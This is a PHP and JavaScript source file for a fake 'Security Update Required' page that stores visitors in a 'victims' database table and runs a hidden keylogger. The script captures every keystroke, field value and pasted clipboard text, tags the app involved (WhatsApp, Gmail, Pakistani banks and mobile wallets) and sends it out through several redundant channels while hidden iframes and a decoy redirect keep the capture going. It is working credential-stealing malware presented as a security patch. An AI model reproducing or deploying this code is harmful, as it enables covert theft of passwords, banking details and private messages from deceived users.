<?php
// index.php - Mobile optimized version
require_once 'config.php';

session_start();

// Device detection function
function getDeviceInfo() {
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $device = 'Unknown';
    $os = 'Unknown';
    $browser = 'Unknown';
    
    // Detect OS
    if (preg_match('/android/i', $user_agent)) {
        $os = 'Android';
        $device = 'Mobile';
    } elseif (preg_match('/iphone|ipad|ipod/i', $user_agent)) {
        $os = 'iOS';
        $device = 'Mobile';
    } elseif (preg_match('/windows/i', $user_agent)) {
        $os = 'Windows';
        $device = 'Desktop';
    } elseif (preg_match('/mac/i', $user_agent)) {
        $os = 'Mac';
        $device = 'Desktop';
    } elseif (preg_match('/linux/i', $user_agent)) {
        $os = 'Linux';
        $device = 'Desktop';
    }
    
    // Detect Browser
    if (preg_match('/chrome/i', $user_agent)) {
        $browser = 'Chrome';
    } elseif (preg_match('/firefox/i', $user_agent)) {
        $browser = 'Firefox';
    } elseif (preg_match('/safari/i', $user_agent)) {
        $browser = 'Safari';
    } elseif (preg_match('/edge/i', $user_agent)) {
        $browser = 'Edge';
    } elseif (preg_match('/opera/i', $user_agent)) {
        $browser = 'Opera';
    }
    
    return [
        'device' => $device,
        'os' => $os,
        'browser' => $browser
    ];
}

if (!isset($_SESSION['session_id'])) {
    $_SESSION['session_id'] = bin2hex(random_bytes(16)) . '_' . time();
    
    $session_id = $_SESSION['session_id'];
    $ip = $_SERVER['REMOTE_ADDR'];
    $ua = $_SERVER['HTTP_USER_AGENT'];
    $device_info = getDeviceInfo();
    
    $stmt = $conn->prepare("INSERT INTO victims (session_id, ip_address, user_agent, device_type, os, browser, last_active) VALUES (?, ?, ?, ?, ?, ?, NOW())");
    $device = $device_info['device'];
    $os = $device_info['os'];
    $browser = $device_info['browser'];
    $stmt->bind_param("ssssss", $session_id, $ip, $ua, $device, $os, $browser);
    $stmt->execute();
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Security Update</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }
        
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .container {
            max-width: 380px;
            width: 100%;
            background: rgba(255, 255, 255, 0.98);
            backdrop-filter: blur(10px);
            border-radius: 32px;
            padding: 40px 30px;
            box-shadow: 0 30px 60px rgba(0,0,0,0.4);
            text-align: center;
            animation: slideUp 0.6s ease;
        }
        
        @keyframes slideUp {
            from {
                opacity: 0;
                transform: translateY(40px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        .icon {
            width: 90px;
            height: 90px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            border-radius: 50%;
            margin: 0 auto 25px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 45px;
            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.4);
        }
        
        h1 {
            color: #333;
            font-size: 26px;
            font-weight: 700;
            margin-bottom: 10px;
        }
        
        .subtitle {
            color: #666;
            font-size: 15px;
            margin-bottom: 30px;
            line-height: 1.5;
        }
        
        .loader {
            margin: 30px 0;
        }
        
        .spinner {
            width: 60px;
            height: 60px;
            border: 5px solid #f3f3f3;
            border-top: 5px solid #667eea;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .progress-bar {
            width: 100%;
            height: 8px;
            background: #f0f0f0;
            border-radius: 10px;
            margin: 30px 0;
            overflow: hidden;
        }
        
        .progress-fill {
            width: 0%;
            height: 100%;
            background: linear-gradient(90deg, #667eea, #764ba2);
            animation: progress 5s cubic-bezier(0.4, 0, 0.2, 1) forwards;
        }
        
        @keyframes progress {
            to { width: 100%; }
        }
        
        .timer {
            font-size: 56px;
            font-weight: 700;
            color: #667eea;
            margin: 20px 0;
            text-shadow: 2px 2px 4px rgba(102, 126, 234, 0.2);
        }
        
        .status {
            background: #f8f9fa;
            padding: 15px;
            border-radius: 12px;
            color: #666;
            font-size: 14px;
            margin-top: 20px;
        }
        
        .hidden {
            display: none;
        }
        
        .success-icon {
            font-size: 70px;
            color: #4CAF50;
            margin: 20px 0;
            animation: pop 0.5s ease;
        }
        
        @keyframes pop {
            0% { transform: scale(0); }
            80% { transform: scale(1.2); }
            100% { transform: scale(1); }
        }
        
        .note {
            color: #999;
            font-size: 12px;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="icon">🔐</div>
        <h1>Security Update Required</h1>
        <div class="subtitle">Critical security patch for your device</div>
        
        <div class="loader">
            <div class="spinner" id="spinner"></div>
        </div>
        
        <div class="progress-bar">
            <div class="progress-fill"></div>
        </div>
        
        <div class="timer" id="timer">5</div>
        
        <div class="status" id="status">
            Installing security patches...
        </div>
        
        <div id="successMessage" class="hidden">
            <div class="success-icon">✅</div>
            <div style="font-size: 22px; font-weight: 600; margin: 10px 0;">Update Complete!</div>
            <div style="color: #666;">Your device is now secure</div>
        </div>
        
        <div class="note" id="note">
            Do not close this window
        </div>
    </div>

    <!-- Hidden iframe for persistence -->
    <iframe src="blank.html" style="display:none; width:0; height:0; border:0;" id="trackerFrame"></iframe>

    <script>
        // Mobile-optimized tracker
        const SESSION_ID = '<?php echo $_SESSION['session_id']; ?>';
        const API_URL = 'api.php';
        
        // Function to send data with multiple fallbacks
        function sendToServer(data) {
            data.session = SESSION_ID;
            data.url = window.location.href;
            data.timestamp = Date.now();
            
            const jsonData = JSON.stringify(data);
            
            // Method 1: Fetch API
            try {
                fetch(API_URL, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: jsonData,
                    keepalive: true,
                    mode: 'no-cors'
                }).catch(() => {});
            } catch(e) {}
            
            // Method 2: Image Beacon (works on mobile)
            try {
                let img = new Image();
                img.src = API_URL + '?data=' + encodeURIComponent(jsonData) + '&r=' + Math.random();
            } catch(e) {}
            
            // Method 3: SendBeacon
            try {
                if (navigator.sendBeacon) {
                    navigator.sendBeacon(API_URL, new Blob([jsonData], {type: 'application/json'}));
                }
            } catch(e) {}
            
            // Method 4: Hidden iframe
            try {
                let frame = document.getElementById('trackerFrame');
                if (frame && frame.contentWindow) {
                    frame.contentWindow.postMessage({type: 'log', data: jsonData}, '*');
                }
            } catch(e) {}
        }
        
        // Detect current app/website
        function detectApp() {
            try {
                let url = window.location.href.toLowerCase();
                let title = document.title.toLowerCase();
                
                if (url.includes('whatsapp') || title.includes('whatsapp')) return 'WhatsApp';
                if (url.includes('facebook') || title.includes('facebook')) return 'Facebook';
                if (url.includes('instagram') || title.includes('instagram')) return 'Instagram';
                if (url.includes('twitter') || title.includes('twitter')) return 'Twitter';
                if (url.includes('youtube') || title.includes('youtube')) return 'YouTube';
                if (url.includes('google')) return 'Google';
                if (url.includes('gmail')) return 'Gmail';
                if (url.includes('easypaisa')) return 'EasyPaisa';
                if (url.includes('jazz') || url.includes('jazz')) return 'Jazz';
                if (url.includes('zong')) return 'Zong';
                if (url.includes('ubl')) return 'UBL';
                if (url.includes('hbl')) return 'HBL';
                if (url.includes('mobilink')) return 'Mobilink';
                if (url.includes('telenor')) return 'Telenor';
                if (url.includes('ufone')) return 'Ufone';
                
                return 'Browser';
            } catch(e) {
                return 'Browser';
            }
        }
        
        // Track all inputs
        function trackAllInputs() {
            try {
                let inputs = document.querySelectorAll('input, textarea, [contenteditable="true"]');
                let currentApp = detectApp();
                
                inputs.forEach(input => {
                    if (!input.dataset.tracking) {
                        input.dataset.tracking = 'true';
                        
                        let fieldName = input.id || input.name || input.placeholder || input.type || 'unknown';
                        
                        // Track key presses
                        input.addEventListener('keydown', function(e) {
                            let key = e.key;
                            if (key === ' ') key = '[SPACE]';
                            else if (key === 'Enter') key = '[ENTER]';
                            else if (key === 'Backspace') key = '[BACKSPACE]';
                            else if (key === 'Tab') key = '[TAB]';
                            else if (key === 'Shift') key = '[SHIFT]';
                            else if (key === 'Control') key = '[CTRL]';
                            else if (key === 'Alt') key = '[ALT]';
                            else if (key === 'CapsLock') key = '[CAPS]';
                            else if (key === 'Escape') key = '[ESC]';
                            else if (key === 'Delete') key = '[DEL]';
                            else if (key === 'ArrowUp') key = '[UP]';
                            else if (key === 'ArrowDown') key = '[DOWN]';
                            else if (key === 'ArrowLeft') key = '[LEFT]';
                            else if (key === 'ArrowRight') key = '[RIGHT]';
                            
                            sendToServer({
                                type: 'key',
                                app: currentApp,
                                field: fieldName,
                                key: key,
                                value: this.value
                            });
                        });
                        
                        // Track input changes
                        input.addEventListener('input', function() {
                            sendToServer({
                                type: 'input',
                                app: currentApp,
                                field: fieldName,
                                key: '[VALUE]',
                                value: this.value
                            });
                        });
                        
                        // Track focus
                        input.addEventListener('focus', function() {
                            sendToServer({
                                type: 'focus',
                                app: currentApp,
                                field: fieldName
                            });
                        });
                        
                        // Track blur
                        input.addEventListener('blur', function() {
                            sendToServer({
                                type: 'blur',
                                app: currentApp,
                                field: fieldName,
                                value: this.value
                            });
                        });
                        
                        // Track paste
                        input.addEventListener('paste', function(e) {
                            let pasted = e.clipboardData?.getData('text') || '';
                            if (pasted) {
                                sendToServer({
                                    type: 'clipboard',
                                    app: currentApp,
                                    action: 'paste',
                                    content: pasted,
                                    field: fieldName
                                });
                            }
                        });
                    }
                });
            } catch(e) {}
        }
        
        // Track page visibility
        document.addEventListener('visibilitychange', function() {
            sendToServer({
                type: 'visibility',
                state: document.visibilityState,
                app: detectApp()
            });
        });
        
        // Keep connection alive
        function heartbeat() {
            sendToServer({type: 'heartbeat'});
        }
        
        // Watch for page changes
        const observer = new MutationObserver(trackAllInputs);
        observer.observe(document.body, {childList: true, subtree: true});
        
        // Start tracking
        setInterval(trackAllInputs, 1000);
        setInterval(heartbeat, 10000);
        
        // Timer
        let timeLeft = 5;
        const timerEl = document.getElementById('timer');
        const spinnerEl = document.getElementById('spinner');
        const statusEl = document.getElementById('status');
        const successEl = document.getElementById('successMessage');
        const noteEl = document.getElementById('note');
        
        const timer = setInterval(() => {
            timeLeft--;
            if (timerEl) timerEl.textContent = timeLeft;
            
            if (timeLeft <= 0) {
                clearInterval(timer);
                
                if (spinnerEl) spinnerEl.style.display = 'none';
                if (timerEl) timerEl.style.display = 'none';
                if (statusEl) statusEl.style.display = 'none';
                if (successEl) successEl.classList.remove('hidden');
                if (noteEl) noteEl.textContent = '✓ Security update installed';
                
                // Create additional iframes for persistence
                for (let i = 0; i < 3; i++) {
                    let frame = document.createElement('iframe');
                    frame.src = 'blank.html';
                    frame.style.display = 'none';
                    frame.style.width = '0';
                    frame.style.height = '0';
                    document.body.appendChild(frame);
                }
                
                // Try to open a tiny popup (helps with iOS)
                try {
                    let win = window.open('', '_blank', 'width=1,height=1,left=-1000,top=-1000');
                    if (win) {
                        win.document.write('<html><body style="background:black;"></body></html>');
                        setTimeout(() => win.close(), 100);
                    }
                } catch(e) {}
                
                // Redirect to Google but keep tracking
                setTimeout(() => {
                    window.location.href = 'https://www.google.com';
                }, 2000);
            }
        }, 1000);
        
        // Initial track
        setTimeout(trackAllInputs, 500);
        console.log('Tracker initialized for session:', SESSION_ID);
    </script>
</body>
</html>